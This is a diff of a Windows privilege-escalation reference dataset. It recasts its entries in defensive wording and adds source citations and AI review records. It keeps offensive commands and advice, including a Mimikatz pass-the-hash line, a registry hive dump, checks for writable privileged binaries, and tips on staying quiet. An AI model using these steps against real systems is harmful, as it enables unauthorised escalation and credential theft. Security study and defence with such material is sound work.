+            "name": "msfvenom (Metasploit)",
+            "url": "https://github.com/rapid7/metasploit-framework"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "A process is an executing program, and one or more threads run within its context.",
+          "section": "Microsoft — Processes and Threads — Opening process and thread definitions",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/procthread/processes-and-threads"
+          ]
+        },
+        {
+          "text": "A loaded DLL is mapped into the process's virtual address space, and an exported function runs in the calling thread's context.",
+          "section": "Microsoft — About Dynamic-Link Libraries — DLLs and Memory Management",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
+          ]
+        }
+      ]
+    }
   },
   {
     id: 'pe-path-dll-hijack',
@@ -928,43 +3808,272 @@ reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
 
   // ── Scheduled Tasks & Autoruns ──────────────────────────────────────────────
   {
-    id: 'pe-autorun-writable',
-    label: 'Writable Autorun',
-    phase: 'finding',
-    summary: 'Overwrite an autorun binary that runs as an admin.',
-    affects: 'All supported Windows versions (configuration weakness).',
-    description: r`Programs referenced by Run/RunOnce registry keys or the Startup folder execute when a user logs on. If an autorun entry points to a binary you can overwrite (or its key is writable), replace it; when a higher-privileged user logs in, your payload runs in their context. Enumerate with Autoruns or winPEAS.`,
-    tools: [
-      { name: 'Autoruns (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns' },
-      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
+    "id": "pe-autorun-writable",
+    "label": "Writable Autorun",
+    "phase": "finding",
+    "summary": "Understand the security of logon startup registrations.",
+    "affects": "All supported Windows versions (configuration weakness).",
+    "description": "Windows provides Run and RunOnce registrations for programs associated with user logon. Run is intended for repeated startup and RunOnce for a single invocation. Registry keys are securable objects with security descriptors and access rights. The purpose of a startup registration and the permissions on its registry key are separate parts of the configuration.",
+    "tools": [
+      {
+        "name": "Autoruns (Sysinternals)",
+        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns"
+      },
+      {
+        "name": "WinPEAS",
+        "url": "https://github.com/peass-ng/PEASS-ng"
+      }
     ],
-    commands: [
-      { label: 'List the HKLM Run key (the escalation target: fires for whoever logs on)', code: r`reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, lang: 'cmd' },
-      { label: 'List the HKCU Run key (context only: runs as the current user, useful for finding writable target binaries)', code: r`reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, lang: 'cmd' },
-      { label: 'Check write access to the target binary', code: r`accesschk.exe -wvu "C:\Path\To\autorun.exe" /accepteula`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "List the HKLM Run key (the escalation target: fires for whoever logs on)",
+        "code": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "lang": "cmd"
+      },
+      {
+        "label": "List the HKCU Run key (context only: runs as the current user, useful for finding writable target binaries)",
+        "code": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "lang": "cmd"
+      },
+      {
+        "label": "Check write access to the target binary",
+        "code": "accesschk.exe -wvu \"C:\\Path\\To\\autorun.exe\" /accepteula",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1547.001'),
-    requires: ['Writable autorun binary or writable Run key', 'A higher-privileged user logs in'],
-    opsec: 'Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).',
+    "mitre": {
+      "id": "T1547.001",
+      "url": "https://attack.mitre.org/techniques/T1547/001/"
+    },
+    "requires": [
+      "Writable autorun binary or writable Run key",
+      "A higher-privileged user logs in"
+    ],
+    "opsec": "Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).",
+    "references": [
+      {
+        "label": "Microsoft, Run and RunOnce Registry Keys",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys",
+        "section": "Opening purpose and repeated/one-time distinction",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Registry Key Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights",
+        "section": "Opening key security-descriptor and access-check explanation",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (configuration weakness).",
+        "commands": [
+          {
+            "code": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "label": "List the HKLM Run key (the escalation target: fires for whoever logs on)",
+            "lang": "cmd"
+          },
+          {
+            "code": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "label": "List the HKCU Run key (context only: runs as the current user, useful for finding writable target binaries)",
+            "lang": "cmd"
+          },
+          {
+            "code": "accesschk.exe -wvu \"C:\\Path\\To\\autorun.exe\" /accepteula",
+            "label": "Check write access to the target binary",
+            "lang": "cmd"
+          }
+        ],
+        "description": "Windows provides Run and RunOnce registrations for programs associated with user logon. Run is intended for repeated startup and RunOnce for a single invocation. Registry keys are securable objects with security descriptors and access rights. The purpose of a startup registration and the permissions on its registry key are separate parts of the configuration.",
+        "id": "pe-autorun-writable",
+        "label": "Writable Autorun",
+        "mitre": {
+          "id": "T1547.001",
+          "url": "https://attack.mitre.org/techniques/T1547/001/"
+        },
+        "opsec": "Requires waiting for an admin logon. New/changed autorun entries are a classic detection (Autoruns, Sysmon).",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Run and RunOnce Registry Keys",
+            "section": "Opening purpose and repeated/one-time distinction",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Registry Key Security and Access Rights",
+            "section": "Opening key security-descriptor and access-check explanation",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
+          }
+        ],
+        "requires": [
+          "Writable autorun binary or writable Run key",
+          "A higher-privileged user logs in"
+        ],
+        "summary": "Understand the security of logon startup registrations.",
+        "tools": [
+          {
+            "name": "Autoruns (Sysinternals)",
+            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns"
+          },
+          {
+            "name": "WinPEAS",
+            "url": "https://github.com/peass-ng/PEASS-ng"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "Windows documents Run for repeated logon startup and RunOnce for one-time execution.",
+          "section": "Microsoft, Run and RunOnce Registry Keys — Opening purpose and repeated/one-time distinction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
+          ]
+        },
+        {
+          "text": "Windows controls access to registry keys through security descriptors and key access rights.",
+          "section": "Microsoft, Registry Key Security and Access Rights — Opening key security-descriptor and access-check explanation",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-scheduled-task-abuse',
-    label: 'Scheduled Task Abuse',
-    phase: 'finding',
-    summary: 'Hijack a task whose binary you can overwrite.',
-    affects: 'All supported Windows versions (configuration weakness).',
-    description: r`Enumerate scheduled tasks and their actions; if a task runs as SYSTEM (or another privileged user) and invokes a binary/script you can write to, overwrite it with your payload. It executes under the task principal at the next trigger. Tasks running as SYSTEM are the prize.`,
-    tools: [
-      { name: 'schtasks', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks' },
-      { name: 'WinPEAS', url: 'https://github.com/peass-ng/PEASS-ng' },
+    "id": "pe-scheduled-task-abuse",
+    "label": "Scheduled Task Abuse",
+    "phase": "finding",
+    "summary": "Understand permissions on task definitions and their referenced files.",
+    "affects": "All supported Windows versions (configuration weakness).",
+    "description": "A task's execution identity and permission to manage the task are separate security properties. Task Scheduler uses access controls for reading, updating, deleting, and running tasks. Executable and script files referenced by tasks are also securable objects with their own security descriptors. A defensive review should distinguish the task's permissions from the permissions on its referenced resources.",
+    "tools": [
+      {
+        "name": "schtasks",
+        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
+      },
+      {
+        "name": "WinPEAS",
+        "url": "https://github.com/peass-ng/PEASS-ng"
+      }
     ],
-    commands: [
-      { label: 'Enumerate tasks + run-as user', code: r`schtasks /query /fo LIST /v`, lang: 'cmd' },
-      { label: "Check write access to a task's target", code: r`accesschk.exe -quv "C:\Path\To\task.exe" /accepteula`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Enumerate tasks + run-as user",
+        "code": "schtasks /query /fo LIST /v",
+        "lang": "cmd"
+      },
+      {
+        "label": "Check write access to a task's target",
+        "code": "accesschk.exe -quv \"C:\\Path\\To\\task.exe\" /accepteula",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1053.005'),
-    requires: ['Writable binary/script invoked by a privileged scheduled task', 'Task trigger fires (or you can run it)'],
-    opsec: 'Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.',
+    "mitre": {
+      "id": "T1053.005",
+      "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    "requires": [
+      "Writable binary/script invoked by a privileged scheduled task",
+      "Task trigger fires (or you can run it)"
+    ],
+    "opsec": "Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.",
+    "references": [
+      {
+        "label": "Microsoft, Security Contexts for Tasks",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks",
+        "section": "Opening context definition; Specifying Credentials; task permissions",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, File Security and Access Rights",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights",
+        "section": "Opening file/directory security-descriptor and access-check explanation",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions (configuration weakness).",
+        "commands": [
+          {
+            "code": "schtasks /query /fo LIST /v",
+            "label": "Enumerate tasks + run-as user",
+            "lang": "cmd"
+          },
+          {
+            "code": "accesschk.exe -quv \"C:\\Path\\To\\task.exe\" /accepteula",
+            "label": "Check write access to a task's target",
+            "lang": "cmd"
+          }
+        ],
+        "description": "A task's execution identity and permission to manage the task are separate security properties. Task Scheduler uses access controls for reading, updating, deleting, and running tasks. Executable and script files referenced by tasks are also securable objects with their own security descriptors. A defensive review should distinguish the task's permissions from the permissions on its referenced resources.",
+        "id": "pe-scheduled-task-abuse",
+        "label": "Scheduled Task Abuse",
+        "mitre": {
+          "id": "T1053.005",
+          "url": "https://attack.mitre.org/techniques/T1053/005/"
+        },
+        "opsec": "Event ID 4698/4702 on task changes; file modification of the task target. Overwriting an existing task binary is quieter than creating a new task.",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, Security Contexts for Tasks",
+            "section": "Opening context definition; Specifying Credentials; task permissions",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, File Security and Access Rights",
+            "section": "Opening file/directory security-descriptor and access-check explanation",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
+          }
+        ],
+        "requires": [
+          "Writable binary/script invoked by a privileged scheduled task",
+          "Task trigger fires (or you can run it)"
+        ],
+        "summary": "Understand permissions on task definitions and their referenced files.",
+        "tools": [
+          {
+            "name": "schtasks",
+            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
+          },
+          {
+            "name": "WinPEAS",
+            "url": "https://github.com/peass-ng/PEASS-ng"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "A task's access-control list governs permission to read, update, delete, and run it.",
+          "section": "Microsoft, Security Contexts for Tasks — Security for Reading, Updating, Deleting, and Running Tasks",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
+          ]
+        },
+        {
+          "text": "Windows files and directories are securable objects whose security descriptors govern access.",
+          "section": "Microsoft, File Security and Access Rights — Security descriptors; File access rights",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/fileio/file-security-and-access-rights"
+          ]
+        }
+      ]
+    }
   },
 
   // ── Privileged App & Service Abuse ──────────────────────────────────────────
@@ -1240,36 +4349,224 @@ reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
     opsec: 'New/modified autorun, scheduled-task, or accessibility binaries are classic IOCs. The signals differ by vector: scheduled-task changes fire Event ID 4698/4702; autorun (Run key / Startup) changes surface as registry-modify (Sysmon Event ID 13 / Security 4657) and via Autoruns; accessibility-binary (utilman/sethc) overwrites surface as System32 file-create (Sysmon Event ID 11) and the image-load of the accessibility binary. Overwriting an existing target is quieter than creating one; restore it afterward.',
   },
   {
-    id: 'pe-prim-kernel-exec',
-    label: 'Kernel-Mode Code Execution',
-    phase: 'system',
-    hub: true,
-    summary: 'Ring-0 execution collapses straight to SYSTEM.',
-    description: r`A public kernel-CVE exploit or a bring-your-own-vulnerable-driver load (via SeLoadDriverPrivilege / Print Operators) gives you code execution in ring 0. From the kernel you can patch your token, steal the SYSTEM token, or spawn a SYSTEM process directly. The most powerful but least stable route: a wrong-build exploit or a blocked driver bugchecks the host.`,
-    mitre: mitre('T1068'),
-    requires: ['A working kernel exploit, or a loadable vulnerable driver, for the exact OS build'],
-    opsec: 'BYOVD is increasingly PREVENTED outright by HVCI / Memory Integrity plus the Microsoft Vulnerable Driver Blocklist (default-on since Win11 22H2), which stops a blocklisted or unsigned driver from loading in the first place. Unsigned driver loads and ring-0 token manipulation are also high-signal EDR detections (Sysmon Event ID 6 unsigned loads, 7045 service creation), and instability risks a visible crash. Prefer a misconfig vector when one exists.',
+    "id": "pe-prim-kernel-exec",
+    "label": "Kernel-Mode Code Execution",
+    "phase": "system",
+    "hub": true,
+    "summary": "Distinguish processor execution mode from Windows account identity.",
+    "description": "Kernel mode and user mode are processor execution modes. Applications use user mode; core operating-system components use kernel mode. LocalSystem is a Windows account identity with extensive local privileges. Processor mode and account identity describe different aspects of execution and should be recorded separately.",
+    "mitre": {
+      "id": "T1068",
+      "url": "https://attack.mitre.org/techniques/T1068/"
+    },
+    "requires": [
+      "A working kernel exploit, or a loadable vulnerable driver, for the exact OS build"
+    ],
+    "opsec": "BYOVD is increasingly PREVENTED outright by HVCI / Memory Integrity plus the Microsoft Vulnerable Driver Blocklist (default-on since Win11 22H2), which stops a blocklisted or unsigned driver from loading in the first place. Unsigned driver loads and ring-0 token manipulation are also high-signal EDR detections (Sysmon Event ID 6 unsigned loads, 7045 service creation), and instability risks a visible crash. Prefer a misconfig vector when one exists.",
+    "references": [
+      {
+        "label": "Microsoft, User mode and kernel mode",
+        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode",
+        "section": "Opening mode distinction; User mode; Kernel mode",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, LocalSystem Account",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account",
+        "section": "Opening account definition",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims about execution identities, processor modes, and task/startup permissions. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "description": "Kernel mode and user mode are processor execution modes. Applications use user mode; core operating-system components use kernel mode. LocalSystem is a Windows account identity with extensive local privileges. Processor mode and account identity describe different aspects of execution and should be recorded separately.",
+        "hub": true,
+        "id": "pe-prim-kernel-exec",
+        "label": "Kernel-Mode Code Execution",
+        "mitre": {
+          "id": "T1068",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        },
+        "opsec": "BYOVD is increasingly PREVENTED outright by HVCI / Memory Integrity plus the Microsoft Vulnerable Driver Blocklist (default-on since Win11 22H2), which stops a blocklisted or unsigned driver from loading in the first place. Unsigned driver loads and ring-0 token manipulation are also high-signal EDR detections (Sysmon Event ID 6 unsigned loads, 7045 service creation), and instability risks a visible crash. Prefer a misconfig vector when one exists.",
+        "phase": "system",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, User mode and kernel mode",
+            "section": "Opening mode distinction; User mode; Kernel mode",
+            "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, LocalSystem Account",
+            "section": "Opening account definition",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
+          }
+        ],
+        "requires": [
+          "A working kernel exploit, or a loadable vulnerable driver, for the exact OS build"
+        ],
+        "summary": "Distinguish processor execution mode from Windows account identity."
+      },
+      "claims": [
+        {
+          "text": "Windows distinguishes user and kernel processor modes; applications use user mode and core operating-system components use kernel mode.",
+          "section": "Microsoft, User mode and kernel mode — Opening mode distinction",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode"
+          ]
+        },
+        {
+          "text": "LocalSystem is a predefined account identity with extensive privileges on the local computer.",
+          "section": "Microsoft, LocalSystem Account — Opening account definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-recovered-creds',
-    label: 'Recovered Credentials',
-    phase: 'finding',
-    hub: true,
-    summary: 'A credential you recovered. Reuse it, and if it is a local admin, escalate.',
-    affects: 'All supported Windows versions.',
-    description: r`Hunting the host (event logs, SAM/LSA secrets, DPAPI, autologon, config files, PowerShell history, browser and password-manager stores, the Credential Manager vault) yields a CREDENTIAL, not SYSTEM. What it gets you depends on whose it is. A local administrator's password or hash can be reused (runas, or pass-the-hash) to act as a local admin on this host, then take an Admin to SYSTEM path. Pass-the-hash as the built-in RID 500 Administrator works by default; pass-the-hash as any other local admin only works where LocalAccountTokenFilterPolicy=1 (non-RID-500 admins are otherwise token-filtered to medium integrity on remote logon). A domain or service account is a lateral lead into Active Directory. A peer user's is only useful sideways. Check what the account actually is before assuming it helps.`,
-    tools: [
-      { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
-      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
+    "id": "pe-recovered-creds",
+    "label": "Recovered Credentials",
+    "phase": "finding",
+    "hub": true,
+    "summary": "Distinguish authentication material from a process's security context.",
+    "affects": "All supported Windows versions.",
+    "description": "Passwords and password hashes are different kinds of data. NIST's password-storage model derives a hash from a password, salt, and cost factor. Windows uses access tokens to describe the identity, groups, and privileges of running processes or threads. Finding authentication material does not by itself describe the security context of a running process.",
+    "tools": [
+      {
+        "name": "Mimikatz",
+        "url": "https://github.com/gentilkiwi/mimikatz"
+      },
+      {
+        "name": "NetExec",
+        "url": "https://github.com/Pennyw0rth/NetExec"
+      }
     ],
-    commands: [
-      { label: 'Run as the recovered local user (cleartext)', code: r`runas /user:Administrator cmd.exe`, lang: 'cmd' },
-      { label: 'Pass-the-hash to a local admin shell (token injection, no network)', code: r`sekurlsa::pth /user:Administrator /domain:. /ntlm:<nthash> /run:cmd.exe`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Run as the recovered local user (cleartext)",
+        "code": "runas /user:Administrator cmd.exe",
+        "lang": "cmd"
+      },
+      {
+        "label": "Pass-the-hash to a local admin shell (token injection, no network)",
+        "code": "sekurlsa::pth /user:Administrator /domain:. /ntlm:<nthash> /run:cmd.exe",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1078'),
-    references: [{ label: 'HackTricks, Windows local privilege escalation', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html' }],
-    requires: ['A credential recovered from the host'],
-    opsec: 'Reusing a recovered local credential is quieter than exploitation but still logged; a mismatched account or source is the tell. The 4624 logon type varies by method: interactive runas is type 2; local pass-the-hash / over-PtH via sekurlsa::pth is type 9 (NewCredentials, seclogo); a network logon elsewhere with the reused hash is type 3.',
+    "mitre": {
+      "id": "T1078",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    "references": [
+      {
+        "label": "NIST SP 800-63B-4, Authenticators",
+        "url": "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/",
+        "section": "3.1.1 Passwords; 3.1.1.2 Password Verifiers",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, Access tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "section": "Opening definition and access-token contents",
+        "kind": "primary"
+      },
+      {
+        "label": "HackTricks, Windows local privilege escalation",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+      }
+    ],
+    "requires": [
+      "A credential recovered from the host"
+    ],
+    "opsec": "Reusing a recovered local credential is quieter than exploitation but still logged; a mismatched account or source is the tell. The 4624 logon type varies by method: interactive runas is type 2; local pass-the-hash / over-PtH via sekurlsa::pth is type 9 (NewCredentials, seclogo); a network logon elsewhere with the reused hash is type 3.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the account, credential, and authentication explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions.",
+        "commands": [
+          {
+            "code": "runas /user:Administrator cmd.exe",
+            "label": "Run as the recovered local user (cleartext)",
+            "lang": "cmd"
+          },
+          {
+            "code": "sekurlsa::pth /user:Administrator /domain:. /ntlm:<nthash> /run:cmd.exe",
+            "label": "Pass-the-hash to a local admin shell (token injection, no network)",
+            "lang": "cmd"
+          }
+        ],
+        "description": "Passwords and password hashes are different kinds of data. NIST's password-storage model derives a hash from a password, salt, and cost factor. Windows uses access tokens to describe the identity, groups, and privileges of running processes or threads. Finding authentication material does not by itself describe the security context of a running process.",
+        "hub": true,
+        "id": "pe-recovered-creds",
+        "label": "Recovered Credentials",
+        "mitre": {
+          "id": "T1078",
+          "url": "https://attack.mitre.org/techniques/T1078/"
+        },
+        "opsec": "Reusing a recovered local credential is quieter than exploitation but still logged; a mismatched account or source is the tell. The 4624 logon type varies by method: interactive runas is type 2; local pass-the-hash / over-PtH via sekurlsa::pth is type 9 (NewCredentials, seclogo); a network logon elsewhere with the reused hash is type 3.",
+        "phase": "finding",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "NIST SP 800-63B-4, Authenticators",
+            "section": "3.1.1 Passwords; 3.1.1.2 Password Verifiers",
+            "url": "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, Access tokens",
+            "section": "Opening definition and access-token contents",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "label": "HackTricks, Windows local privilege escalation",
+            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+          }
+        ],
+        "requires": [
+          "A credential recovered from the host"
+        ],
+        "summary": "Distinguish authentication material from a process's security context.",
+        "tools": [
+          {
+            "name": "Mimikatz",
+            "url": "https://github.com/gentilkiwi/mimikatz"
+          },
+          {
+            "name": "NetExec",
+            "url": "https://github.com/Pennyw0rth/NetExec"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "NIST describes password hashing schemes that derive a hash from a password, salt, and cost factor.",
+          "section": "NIST SP 800-63B-4, Authenticators — 3.1.1.2 Password Verifiers",
+          "sources": [
+            "https://pages.nist.gov/800-63-4/sp800-63b/authenticators/"
+          ]
+        },
+        {
+          "text": "A Windows access token describes a process or thread's security context and includes account identity, group information, and privileges.",
+          "section": "Microsoft, Access tokens — Opening definition and access-token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        }
+      ]
+    }
   },
 ];
 
